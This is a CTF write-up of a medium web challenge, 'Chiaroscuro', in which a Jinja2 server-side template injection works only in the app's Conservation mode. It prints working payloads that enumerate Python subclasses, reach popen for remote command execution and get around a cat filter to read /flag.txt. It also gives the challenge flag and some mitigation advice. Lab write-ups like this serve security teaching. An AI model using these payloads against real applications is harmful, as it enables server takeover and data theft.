# Chiaroscuro - Web Challenge Writeup

## Challenge Information
- **Platform**: UWSP Pointer Overflow CTF
- **Category**: Web
- **Difficulty**: Medium
- **URL**: https://web200-3.pointeroverflowctf.com/

## Flag
```
poctf{uwsp_b34u7y_15_l16h7_4nd_d4rk}
```

## Overview
"Chiaroscuro" is an art conservation web application that allows viewing artwork in two modes: "Display Preview" and "Conservation". The challenge name refers to the artistic technique of using strong contrasts between light and dark, which is a hint about the dual viewing modes.

## Vulnerability Discovery

### Initial Reconnaissance
1. The application features a gallery of artwork images
2. Two viewing profiles are available: "Display Preview" and "Conservation"
3. An annotations submission form accepts text input for processing
4. The description mentions a "curator pipeline" for conservators

### Key Finding: Profile-Dependent SSTI
The critical discovery was that the application's behavior differs drastically between viewing profiles:

- **Display Preview Mode**: User input is properly escaped/sanitized (HTML-encoded)
- **Conservation Mode**: User input is processed through a template engine WITHOUT proper sanitization

Testing basic Server-Side Template Injection (SSTI) payload `{{7*7}}`:
- Display Preview: Returns `{{7*7}}` (escaped)
- Conservation Mode: Returns `49` (evaluated) ✓

This confirmed an SSTI vulnerability exclusively in Conservation mode.

## Exploitation

### Step 1: Identify Template Engine
Based on the syntax and Python/Flask context, the template engine is **Jinja2**.

### Step 2: Find Exploitable Class
Enumerated Python class hierarchy to find classes with access to dangerous functions:

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

Found `os._wrap_close` at index 142, which provides access to `__init__.__globals__` containing OS functions.

### Step 3: Achieve Remote Code Execution
Using the `popen` function from `__globals__`:

```python
{{''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['popen']('COMMAND').read()}}
```

### Step 4: Locate and Read Flag
1. Listed root directory: `ls -la /`
2. Found `/flag.txt` in the output
3. Commands like `cat` were filtered/blocked
4. Successfully read flag using alternative method: `head /flag.txt`

**Final Payload**:
```python
{{''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['popen']('head /flag.txt').read()}}
```

## Key Insights

1. **Dual Behavior**: The vulnerability only exists in "Conservation" mode, requiring attackers to first switch viewing profiles
2. **Command Filtering**: While `cat` was blocked, many alternative file-reading commands (`head`, `tail`, `base64`, etc.) worked
3. **Theme Connection**: The flag "beauty is light and dark" directly references the chiaroscuro art technique, tying the technical vulnerability to the challenge's artistic theme

## Exploitation Script
See [get_flag.py](get_flag.py) for the complete exploitation script.

## Mitigation Recommendations
1. Always sanitize user input before template rendering
2. Use sandboxed template environments (e.g., Jinja2's SandboxedEnvironment)
3. Avoid passing user input directly to template.render() without validation
4. Implement consistent security controls across all application modes/profiles
